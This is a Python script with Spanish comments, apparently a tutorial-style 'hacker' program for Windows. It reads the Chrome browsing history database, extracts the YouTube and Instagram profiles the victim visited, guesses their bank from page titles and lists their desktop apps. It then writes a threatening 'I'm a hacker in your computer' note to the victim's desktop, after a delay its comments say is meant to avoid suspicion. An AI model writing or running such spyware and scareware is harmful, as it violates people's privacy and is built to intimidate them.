import os
import random
import re
import sqlite3
from pathlib import Path
from time import sleep

HACKER_FILE_NAME = "PARA TI.txt"


def get_user_path():
    return "{}\\".format(Path.home())
    # De esta forma no tenemos que saber si el usuario trabaja en la unidad C: o D: o F:
    # La otra forma de hacerlo era user_path = "C\\Users\\" + os.getlogin()


def delay_action():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    number_of_time = random.randrange(1, 4)
    print("Durmiendo {} segundos".format(number_of_time))
    sleep(number_of_time)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y me he colado en tu ordenador.\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:  # Repetimos este bucle porque puede que Chrome esté abierto. Repetimos cada 10 segundos hasta
        # que pueda acceder
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\History"  # Puede que
            # haya que cambiar la ruta en función de donde se guarde el historial del usuario
            conncetion = sqlite3.connect(history_path)
            cursor = conncetion.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            conncetion.close()
            return urls
        except sqlite3.OperationalError:
            print("La base de datos está bloqueada ya que Chrome está abierto en este momento. Reintentando en 10 "
                  "segundos")
            sleep(10)


def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
    youtube_profiles_visited = []
    for item in chrome_history:
        # Usamos una regular expresion que es como un buscador de texto pero mucho más avanzado. Escribimos la url de
        # la página web de la que queremos extraer información y con A-Za-z0-9 recorremos todas las letras y numeros
        # que se usan para crear texto, por lo que buscamos estas coincidencias. Se puede capturar el contenido que se
        # extarer de la regular expresion poniéndolo entre paréntesis
        results = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
        if results:
            print(results[0])
            youtube_profiles_visited.append(results[0])  # Results siempre es una lista aunque solo tenga una cosa por
            # eso ponemos el 0
    hacker_file.write("He visto que has estado husmeando estos perfiles de youtube últimamente\n{}"
                      .format("\n".join(youtube_profiles_visited)))


def check_instagram_profiles_and_scare_user(hacker_file, chrome_history):
    instagram_profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://www.instagram.com/([A-Za-z0-9]+)/", item[2])
        if results and results[0] not in ["stories", "accounts", "home"]:
            print(results[0])
            instagram_profiles_visited.append(results[0])
    hacker_file.write("\n" + "\nHe visto que también has estado husmeando estos perfiles de instagram últimamente\n{}"
                      .format("\n".join(instagram_profiles_visited)))


def check_bank_account(hacker_file, chrome_history):
    list_banks = ["BBVA", "CaixaBank", "Santander", "Bankia", "Sabadell", "Unicaja", "Kutxabank", "Abanca",
                  "Ibercaja", "Bankinter"]
    his_bank = None
    for item in chrome_history:
        for b in list_banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
            else:
                pass
        if his_bank:
            break
    hacker_file.write("\n" + "\nAdemás, veo que guardas el dinero en el banco {}. Interesante...".format(his_bank))
    print(his_bank)


def chek_user_apps(hacker_file):
    try:
        desktop_path = "C:\\Users\\" + os.getlogin() + "\\Desktop"
        apps = os.listdir(desktop_path)  # Obtenemos la lista de todos los elementos en el escritorio
        filtered_apps = [app for app in apps if app.endswith(".lnk")]  # Filtrar los elementos que terminan en ".lnk" ya
        # que serán accesos directos a las apps

        # Creamos una lista de tuplas con el nombre de la aplicación y su última fecha de modificación
        app_info = [(app, os.path.getmtime(os.path.join(desktop_path, app))) for app in filtered_apps]

        # Ordenar la lista de aplicaciones filtradas por la última fecha de modificación
        sorted_apps = sorted(app_info, key=lambda x: x[1], reverse=True)

        # Obtenemos solo los nombres de las aplicaciones de la lista ordenada
        app_names = [app[0] for app in sorted_apps]
        app_names_string = ', '.join(app_names[:5])  # Tomamos solo las últimas 5 aplicaciones que ha descargado

        hacker_file.write("\n" + "\nAdemás, veo que en tu escritorio tienes estas aplicaciones {}."
                                 "\nTen mucho cuidado, sé que apps utilizas...".format(app_names_string))
    except:
        print("La ruta para este usuario no coincide con la programada, lo siento")


def main():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    delay_action()

    # Generamos la ruta del usuario de windows. Antes lo haciamos con "C:\\Users\\" + os.getlogin()
    user_path = get_user_path()

    # Recogemos su historial del Google cuando sea posible
    chrome_history = get_chrome_history(user_path)

    # Creamos un archivo en su escritorio
    hacker_file = create_hacker_file(user_path)

    # Escribiendo mensajes de miedo según tus perfiles buscados
    check_youtube_profiles_and_scare_user(hacker_file, chrome_history)
    check_instagram_profiles_and_scare_user(hacker_file, chrome_history)

    # Descubriendo en que banco guardas el dinero
    check_bank_account(hacker_file, chrome_history)

    # Descubriendo que aplicaciones tienes en tu escritotio en función de la ultima fecha de modificación
    chek_user_apps(hacker_file)


if __name__ == "__main__":
    main()
